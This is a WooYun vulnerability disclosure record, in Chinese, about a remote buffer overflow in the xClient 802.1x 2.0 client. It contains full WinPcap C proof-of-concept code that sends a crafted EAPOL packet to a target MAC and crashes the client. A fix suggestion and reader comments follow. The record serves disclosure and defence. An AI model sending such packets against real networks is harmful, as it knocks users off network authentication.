{"id": 13317, "wybug_id": "wooyun-2013-019707", "wybug_title": "xClient 802.1x客户端2.0远程缓冲区溢出漏洞，大学影响较严重", "wybug_corp": "xClient", "wybug_author": "cssembly", "wybug_date": "2013-03-08 10:57", "wybug_open_date": "2013-04-22 10:58", "wybug_type": "拒绝服务", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-03-08：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2013-04-22：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： xClient 802.1x客户端2.0是大学中使用较广的H3C802.1x协议认证客户端，由于软件未对收到的数据包中的长度字段进行判定，导致缓冲区溢出，产生了拒绝服务漏洞 详细说明：  \n\n程序取出接收到的数据的第17字节，做符号扩展后，减去4，最后当做长度直接传给了memcpy函数，如果第17个字节为0 - 3之间的任意一个数，最终都会导致memcpy函数的长度字段非常大，最终导致缓冲区溢出   漏洞证明：  poc代码如下：#include \"stdafx.h\"#include <pcap.h>#pragma comment( lib , \"wpcap.lib\" )int _tmain(int argc, _TCHAR* argv[]){\tpcap_t *fp;\tchar errbuf[PCAP_ERRBUF_SIZE];\tu_char packet[1000];\tpcap_if_t *alldevs;\t/* Check the validity of the command line */\tif(pcap_findalldevs(&alldevs, errbuf) == -1)\t{\t\tfprintf(stderr,\"Error in pcap_findalldevs: %s\\n\", errbuf);\t\texit(1);\t}\tpcap_if_t *d;\tint i = 0;\t/* Print the list */\tfor(d=alldevs; d; d=d->next)\t{\t\tprintf(\"%d. %s\", ++i, d->name);\t\tif (d->description)\t\t\tprintf(\" (%s)\\n\", d->description);\t\telse\t\t\tprintf(\" (No description available)\\n\");\t}\t/* 选择相应网卡*/\tif ((fp = pcap_open_live(alldevs->name,\t\t// name of the device\t\t65536,\t\t\t// portion of the packet to capture. It doesn't matter in this case \t\t1,\t\t\t\t// promiscuous mode (nonzero means promiscuous)\t\t1000,\t\t\t// read timeout\t\terrbuf\t\t\t// error buffer\t\t)) == NULL)\t{\t\tfprintf(stderr,\"\\nUnable to open the adapter. %s is not supported by WinPcap\\n\", argv[1]);\t\treturn 2;\t}\tmemset( packet , 0 , 1000 ); \t/* 目标机器mac地址 */\tpacket[0]= 0x00;\tpacket[1]= 0x0C;\tpacket[2]= 0x29;\tpacket[3]= 0x0F;\tpacket[4]= 0x63;\tpacket[5]= 0xDD;\t/* set mac source to 2:2:2:2:2:2 */\tpacket[6]= 2;\tpacket[7]= 2;\tpacket[8]= 2;\tpacket[9]= 2;\tpacket[10]= 2;\tpacket[11]= 2;\t/* 协议头 */\tpacket[12] = 0x88;\tpacket[13] = 0x8e;\tpacket[14] = 0x01;\tpacket[15] = 0x01;\tpacket[0x12] = 0x0A;//此处必须为0x0A\tpacket[23] = '#' + 1;//此处不等于'#' \tpacket[17] = 0;//长度信息\t/* Send down the packet */\tif (pcap_sendpacket(fp,\t// Adapter\t\tpacket,\t\t\t\t// buffer with the packet\t\t1000\t\t// size\t\t) != 0)\t{\t\tfprintf(stderr,\"\\nError sending the packet: %s\\n\", pcap_geterr(fp));\t\treturn 3;\t}\tSleep( 100 );\tif (pcap_sendpacket(fp,\t// Adapter\t\tpacket,\t\t\t\t// buffer with the packet\t\t1000\t\t\t\t\t// size\t\t) != 0)\t{\t\tfprintf(stderr,\"\\nError sending the packet: %s\\n\", pcap_geterr(fp));\t\treturn 3;\t}\tpcap_close(fp);\t\treturn 0;}攻击过程截图：启动运行，并输入用户信息\n\n点击开始认证\n\n运行攻击代码后，程序退出\n\n   修复方案：  加入长度校验，过滤非法数据   版权声明：转载请注明来源 cssembly@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：暂时无回应 漏洞Rank：0  确认时间：2013-03-08 10:57 厂商回复：  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-03-08 12:42 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  - - ||    \n     2013-03-10 21:06 |    \t\tpangshenjie \t\t\t( 普通白帽子  |\t\t\t        Rank:110 漏洞数:14        )\t\t \n  =.=好高级的样子    \n     2013-04-23 15:41 |    \t\tchar \t\t\t( 路人 |\t\t\t        Rank:13 漏洞数:3        | 中国平安，不只保险这么简单。)\t\t \n  虽不明，但觉厉。    \n     2013-04-23 16:51 |    \t\tliyang \t\t\t( 路人 |\t\t\t        Rank:25 漏洞数:11        | 低调 沉默 守望)\t\t \n  那个软件貌似很久不更新了，作者是谁，我都不知道，还不兼容win8~~    \n  \n\n\n", "wybug_level_fromcorp": "暂时无回应", "wybug_rank_fromcorp": 0, "Ranks": null}